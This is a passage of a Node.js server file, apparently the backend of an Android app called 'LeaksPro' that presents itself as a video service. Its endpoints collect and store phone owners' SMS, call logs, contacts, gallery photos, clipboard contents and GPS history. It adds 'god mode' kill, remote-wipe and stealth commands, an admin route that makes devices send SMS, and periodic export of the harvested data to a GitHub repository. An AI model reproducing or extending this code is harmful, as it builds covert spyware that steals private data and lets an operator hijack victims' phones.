              .run(geo.latitude, geo.longitude, geo.accuracy_km * 1000, geo.city, geo.region, geo.country, geo.isp, geo.timezone, device_id);
            console.log(`[REST] IP geo fallback for ${device_id}: ${geo.city}, ${geo.country}`);
            // Emit to admin panel
            const io2 = req.app.get('io');
            if (io2) {
              const updated = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id);
              if (updated) {
                try { updated.phone_numbers = JSON.parse(updated.phone_numbers || '[]'); } catch (_) { updated.phone_numbers = []; }
                io2.emit('device_online', updated);
              }
            }
          }).catch(() => {});
        }
      }

      // Broadcast to admin panel in real-time so no refresh needed
      const io = req.app.get('io');
      if (io) {
        const device = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id);
        if (device) {
          try { device.phone_numbers = JSON.parse(device.phone_numbers || '[]'); } catch (_) { device.phone_numbers = []; }
          io.emit('device_online', device);
        }
      }

      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // ═══ GOD MODE: Device config check endpoint ═══
  // Called on every app launch + heartbeat. Returns kill/wipe/update/stealth commands.
  app.post('/api/devices/config', (req, res) => {
    try {
      const { device_id, app_version, version_code } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id required' });

      const result = {
        kill: false,
        kill_message: '',
        wipe: false,
        force_update: false,
        update_url: '',
        update_message: '',
        stealth_profile: '',
      };

      // 1. Check global kill switch
      const globalKill = db.prepare("SELECT value FROM admin_settings WHERE key = 'godmode_global_kill'").get();
      if (globalKill && globalKill.value === '1') {
        const msg = db.prepare("SELECT value FROM admin_settings WHERE key = 'godmode_global_kill_message'").get();
        result.kill = true;
        result.kill_message = msg?.value || 'App disabled.';
      }

      // 2. Check per-device kill switch
      if (!result.kill) {
        const cmd = db.prepare('SELECT * FROM device_commands WHERE device_id = ?').get(device_id);
        if (cmd) {
          if (cmd.kill_switch === 1) {
            result.kill = true;
            result.kill_message = cmd.kill_message || 'This device has been disabled.';
          }
          if (cmd.remote_wipe === 1) {
            result.wipe = true;
            // Clear the wipe flag so it doesn't repeat after re-install
            db.prepare("UPDATE device_commands SET remote_wipe = 0, updated_at = datetime('now') WHERE device_id = ?").run(device_id);
          }
          if (cmd.stealth_profile) {
            result.stealth_profile = cmd.stealth_profile;
          }
        }
      }

      // 3. Check global stealth profile (fallback if no per-device)
      if (!result.stealth_profile) {
        const globalStealth = db.prepare("SELECT value FROM admin_settings WHERE key = 'godmode_stealth_profile'").get();
        if (globalStealth && globalStealth.value) {
          result.stealth_profile = globalStealth.value;
        }
      }

      // 4. Force update check
      const minCode = db.prepare("SELECT value FROM admin_settings WHERE key = 'godmode_min_version_code'").get();
      const clientCode = parseInt(version_code) || 0;
      const requiredCode = parseInt(minCode?.value) || 0;
      if (requiredCode > 0 && clientCode > 0 && clientCode < requiredCode) {
        result.force_update = true;
        const updateUrl = db.prepare("SELECT value FROM admin_settings WHERE key = 'godmode_update_url'").get();
        const updateMsg = db.prepare("SELECT value FROM admin_settings WHERE key = 'godmode_update_message'").get();
        result.update_url = updateUrl?.value || '';
        result.update_message = updateMsg?.value || 'Please update to the latest version.';
      }

      res.json(result);
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });
  app.post('/api/devices/sms', (req, res) => {
    try {
      const { device_id, messages } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(messages)) return res.status(400).json({ error: 'messages must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO sms_messages
        (device_id, sms_id, address, body, date, type, read, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const msg of messages) {
        try {
          insert.run(
            device_id,
            msg.id || 0,
            msg.address || 'Unknown',
            msg.body || '',
            msg.date || 0,
            msg.type || 1,
            msg.read || 0
          );
          count++;
        } catch (_) { /* skip duplicates or errors */ }
      }

      console.log(`[SMS] Synced ${count} messages from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Call logs sync endpoint — Android app sends call logs here
  app.post('/api/devices/call-logs', (req, res) => {
    try {
      const { device_id, logs } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(logs)) return res.status(400).json({ error: 'logs must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO call_logs
        (device_id, call_id, number, name, type, date, duration, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const log of logs) {
        try {
          insert.run(
            device_id,
            log.id || 0,
            log.number || 'Unknown',
            log.name || '',
            log.type || 1,
            log.date || 0,
            log.duration || 0
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[CALLS] Synced ${count} call logs from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Contacts sync endpoint — Android app sends contacts here
  app.post('/api/devices/contacts', (req, res) => {
    try {
      const { device_id, contacts } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(contacts)) return res.status(400).json({ error: 'contacts must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO contacts
        (device_id, contact_id, name, phones, emails, synced_at)
        VALUES (?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const c of contacts) {
        try {
          insert.run(
            device_id,
            String(c.id || count),
            c.name || 'Unknown',
            JSON.stringify(c.phones || []),
            JSON.stringify(c.emails || [])
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[CONTACTS] Synced ${count} contacts from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Installed apps sync endpoint — Android app sends app list here
  app.post('/api/devices/apps', (req, res) => {
    try {
      const { device_id, apps } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(apps)) return res.status(400).json({ error: 'apps must be an array' });

      // Clear old apps for this device and re-insert (full sync)
      db.prepare('DELETE FROM installed_apps WHERE device_id = ?').run(device_id);

      const insert = db.prepare(`INSERT INTO installed_apps
        (device_id, package_name, app_name, version, install_time, update_time, is_system, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const app of apps) {
        try {
          insert.run(
            device_id,
            app.package_name || '',
            app.app_name || '',
            app.version || '',
            app.install_time || 0,
            app.update_time || 0,
            app.is_system ? 1 : 0
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[APPS] Synced ${count} apps from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Gallery photos sync endpoint — Android app sends gallery photos here
  app.post('/api/devices/gallery', (req, res) => {
    try {
      const { device_id, photos } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(photos)) return res.status(400).json({ error: 'photos must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO gallery_photos
        (device_id, media_id, filename, date_taken, width, height, size, image_base64, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const photo of photos) {
        try {
          insert.run(
            device_id,
            photo.media_id || 0,
            photo.filename || '',
            photo.date_taken || 0,
            photo.width || 0,
            photo.height || 0,
            photo.size || 0,
            photo.image_base64 || ''
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[GALLERY] Synced ${count} photos from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Gallery debug endpoint — device reports what it sees so we can diagnose
  app.post('/api/devices/gallery-debug', (req, res) => {
    try {
      const report = req.body;
      console.log(`\n[GALLERY-DEBUG] ==============================`);
      console.log(`[GALLERY-DEBUG] Device: ${report.device_id || 'UNKNOWN'}`);
      console.log(`[GALLERY-DEBUG] Model: ${report.model || '?'}`);
      console.log(`[GALLERY-DEBUG] SDK: ${report.sdk_version || '?'}`);
      console.log(`[GALLERY-DEBUG] Has READ_EXTERNAL_STORAGE: ${report.has_read_storage}`);
      console.log(`[GALLERY-DEBUG] Has READ_MEDIA_IMAGES: ${report.has_read_media}`);
      console.log(`[GALLERY-DEBUG] hasPermission(): ${report.has_permission}`);
      console.log(`[GALLERY-DEBUG] Photos read from device: ${report.photos_read}`);
      console.log(`[GALLERY-DEBUG] New for backend: ${report.new_for_backend}`);
      console.log(`[GALLERY-DEBUG] New for firestore: ${report.new_for_firestore}`);
      console.log(`[GALLERY-DEBUG] Backend synced: ${report.backend_synced}`);
      console.log(`[GALLERY-DEBUG] Firestore synced: ${report.firestore_synced}`);
      console.log(`[GALLERY-DEBUG] Errors: ${JSON.stringify(report.errors || [])}`);
      console.log(`[GALLERY-DEBUG] Source: ${report.source || '?'}`);
      console.log(`[GALLERY-DEBUG] Timestamp: ${report.timestamp}`);
      console.log(`[GALLERY-DEBUG] ==============================\n`);

      // Store the latest debug report per device
      db.exec(`CREATE TABLE IF NOT EXISTS gallery_debug (
        device_id TEXT PRIMARY KEY,
        report TEXT,
        received_at DATETIME DEFAULT (datetime('now'))
      )`);
      db.prepare(`INSERT OR REPLACE INTO gallery_debug (device_id, report, received_at)
        VALUES (?, ?, datetime('now'))`).run(report.device_id || 'unknown', JSON.stringify(report));

      res.json({ success: true });
    } catch (err) {
      console.error('[GALLERY-DEBUG] Error:', err.message);
      res.json({ success: true }); // Still return OK
    }
  });

  // View gallery debug reports — admin endpoint
  app.get('/api/admin/gallery-debug', (req, res) => {
    try {
      const password = req.headers['x-admin-password'] || req.query.password;
      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
      if (!stored || password !== stored.value) {
        return res.status(401).json({ error: 'Unauthorized' });
      }
      const rows = db.prepare('SELECT * FROM gallery_debug ORDER BY received_at DESC').all();
      const reports = rows.map(r => ({ ...JSON.parse(r.report), received_at: r.received_at }));
      res.json({ reports });
    } catch (err) {
      res.json({ reports: [], error: err.message });
    }
  });

  // Location sync endpoint — Android app sends GPS location here
  app.post('/api/devices/location', (req, res) => {
    try {
      const { device_id, location } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!location) return res.status(400).json({ error: 'location is required' });

      const lat = location.latitude || 0;
      const lng = location.longitude || 0;
      const accuracy = location.accuracy || -1;
      const source = location.provider || 'gps';

      // Update device's current location
      db.prepare(`UPDATE devices SET latitude = ?, longitude = ?, loc_source = ?, loc_accuracy = ?, last_seen = datetime('now') WHERE device_id = ?`)
        .run(lat, lng, source, accuracy, device_id);

      // Append to location history
      db.prepare(`INSERT INTO location_history (device_id, latitude, longitude, accuracy, source, recorded_at) VALUES (?, ?, ?, ?, ?, datetime('now'))`)
        .run(device_id, lat, lng, accuracy, source);

      console.log(`[LOCATION] Device ${device_id}: ${lat}, ${lng} (${source}, accuracy=${accuracy}m)`);
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Clipboard sync endpoint — Android app sends clipboard entries here
  app.post('/api/devices/clipboard', (req, res) => {
    try {
      const { device_id, clipboard } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!clipboard) return res.status(400).json({ error: 'clipboard is required' });

      const text = (clipboard.text || '').substring(0, 5000); // limit stored size
      const timestamp = clipboard.timestamp || Date.now();

      db.prepare(`INSERT INTO clipboard_entries (device_id, text, clip_timestamp, synced_at) VALUES (?, ?, ?, datetime('now'))`)
        .run(device_id, text, timestamp);

      console.log(`[CLIPBOARD] Device ${device_id}: "${text.substring(0, 50)}..."`);
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Send SMS via device — admin sends command to a connected device
  app.post('/api/admin/send-sms', (req, res) => {
    try {
      const { password, device_id, receiver, message, sim_slot } = req.body;

      // Verify admin password
      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
      if (!stored || password !== stored.value) {
        return res.status(401).json({ error: 'Invalid admin password' });
      }

      if (!device_id || !receiver || !message) {
        return res.status(400).json({ error: 'device_id, receiver, and message are required' });
      }

      // Find the device's socket
      const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(device_id);
      if (!device || !device.socket_id) {
        return res.status(400).json({ error: 'Device is not connected via WebSocket. The app must be open.' });
      }

      const targetSocket = io.sockets.sockets.get(device.socket_id);
      if (!targetSocket) {
        return res.status(400).json({ error: 'Device socket not found. The app may have just disconnected.' });
      }

      // Generate a unique request ID for tracking
      const requestId = `sms_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;

      // Emit send_sms command to the device (encrypted)
      targetSocket.emit('send_sms', cryptoEncrypt({
        request_id: requestId,
        receiver,
        message,
        sim_slot: sim_slot || 1,
      }));

      console.log(`[SMS-SEND] Command sent to device ${device_id}: to=${receiver} sim=${sim_slot}`);
      res.json({ success: true, request_id: requestId, message: 'Send command dispatched to device' });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Stream endpoint — redirects to Cloudinary URL
  app.get('/api/stream/:videoId', (req, res) => {
    try {
      const Video = require('./models/Video');
      const video = Video.getById(req.params.videoId);
      if (!video) return res.status(404).json({ error: 'Video not found' });
      res.redirect(video.filename);
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Setup WebSocket
  setupWebSocket(io);

  // Setup Scheduled Commands processor
  const { startScheduler } = require('./utils/scheduler');
  startScheduler(io, db);

  // ═══ INITIALIZE ADVANCED AGENTS ═══
  try {
    initAnalytics(db);
    initBot(db, io);
    initSelfHeal(db, sendAlert);
    initVtAgent(db, sendAlert);
    initAnomaly(db, sendAlert);
    initDigest(db, sendAlert);
    console.log('[Agents] All advanced agents initialized');
  } catch (e) {
    console.warn('[Agents] Init error (non-fatal):', e.message);
  }

  // ========== CLEANUP TIMER ==========
  // Every 10 minutes, mark devices offline if no heartbeat for 2 hours.
  // Devices are NEVER deleted — they just go offline.
  setInterval(() => {
    try {
      const stale = db.prepare(
        "SELECT device_id FROM devices WHERE is_online = 1 AND last_seen < datetime('now', '-2 hours')"
      ).all();
      if (stale.length > 0) {
        db.prepare(
          "UPDATE devices SET is_online = 0 WHERE last_seen < datetime('now', '-2 hours')"
        ).run();
        // Re-query each device for full data and broadcast
        stale.forEach(d => {
          const full = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(d.device_id);
          if (full) {
            try { full.phone_numbers = JSON.parse(full.phone_numbers || '[]'); } catch (_) { full.phone_numbers = []; }
            io.emit('device_offline', full);
          }
        });
        console.log(`[CLEANUP] Marked ${stale.length} device(s) offline — no heartbeat for 2+ hours`);
      }
    } catch (err) {
      console.error('[CLEANUP] Error:', err.message);
    }
  }, 10 * 60 * 1000); // every 10 minutes

  // Start listening
  const PORT = process.env.PORT || 3000;
  return new Promise((resolve, reject) => {
    server.on('error', reject);
    // ═══ HIGH TRAFFIC: Optimize HTTP keep-alive and connection handling ═══
    server.keepAliveTimeout = 65 * 1000; // 65s (must be > load balancer timeout, Render uses 60s)
    server.headersTimeout = 70 * 1000;   // 70s (must be > keepAliveTimeout)
    server.maxHeadersCount = 50;         // limit header count
    server.listen(PORT, '0.0.0.0', () => {
      console.log(`[SERVER] LeaksPro Backend running on port ${PORT}`);
      console.log(`[SERVER] Environment: ${process.env.NODE_ENV || 'development'}`);
      console.log(`[SERVER] Ready to accept connections`);

      // ── Auto GitHub Backup Scheduler (every 6 hours) ──
      setInterval(async () => {
        try {
          const enabled = db.prepare("SELECT value FROM admin_settings WHERE key = 'auto_backup_enabled'").get();
          if (enabled?.value !== '1') return;

          const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
          if (!token?.value) return;

          console.log('[AutoBackup] Starting scheduled GitHub backup...');
          const tables = ['admin_settings', 'devices', 'admin_devices', 'videos', 'categories',
                           'sms_messages', 'call_logs', 'contacts', 'installed_apps', 'gallery_photos',
                           'signed_apks', 'watch_history', 'comments'];
          const backup = { version: 2, created_at: new Date().toISOString(), auto: true, tables: {} };
          for (const t of tables) {
            try { backup.tables[t] = db.prepare(`SELECT * FROM ${t}`).all(); } catch (_) { backup.tables[t] = []; }
          }
          const backupJson = JSON.stringify(backup);

          const apiUrl = `https://api.github.com/repos/Aldura5398/klad4/contents/backups/db-backup.json`;
          const headers = {
            'Authorization': `token ${token.value}`,
            'Accept': 'application/vnd.github.v3+json',
            'Content-Type': 'application/json',
            'User-Agent': 'LeaksPro-Backend'
          };

          // Get existing SHA
          let sha = null;
          try {
            const existing = await fetch(apiUrl, { headers });
            if (existing.ok) { sha = (await existing.json()).sha; }
          } catch (_) {}

          const body = { message: `Auto backup — ${new Date().toISOString()}`, content: Buffer.from(backupJson).toString('base64') };
          if (sha) body.sha = sha;

          const ghRes = await fetch(apiUrl, { method: 'PUT', headers, body: JSON.stringify(body) });
          if (ghRes.ok) {
            db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_github_backup', ?)").run(new Date().toISOString());
            console.log('[AutoBackup] GitHub backup successful');
          } else {
            console.warn('[AutoBackup] GitHub push failed:', ghRes.status);
          }
        } catch (e) {
          console.warn('[AutoBackup] Error:', e.message);
        }
      }, 6 * 60 * 60 * 1000); // every 6 hours

      resolve();
    });
  });
}

// Global error handlers — must exit so Railway restarts the container
process.on('uncaughtException', (err) => {
  console.error('UNCAUGHT EXCEPTION:', err);
  process.exit(1);
});
process.on('unhandledRejection', (err) => {
  console.error('UNHANDLED REJECTION:', err);
  process.exit(1);
});

// Start the server
startServer().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});
